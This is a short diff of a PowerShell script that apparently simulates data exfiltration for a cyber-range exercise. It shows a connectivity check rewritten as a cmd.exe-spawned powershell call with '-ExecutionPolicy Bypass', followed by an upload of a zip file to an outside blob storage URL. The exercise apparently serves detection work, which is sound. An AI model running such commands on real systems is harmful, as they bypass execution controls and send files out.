@@ -103,7 +103,7 @@ $headers = @{
 }
 
 # Create some logs
-Test-NetConnection -ComputerName sacyberrangedanger.blob.core.windows.net -Port 443
+& cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Test-NetConnection sacyberrange00.blob.core.windows.net -Port 443
 
 # Upload the blob using Invoke-WebRequest
 Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath
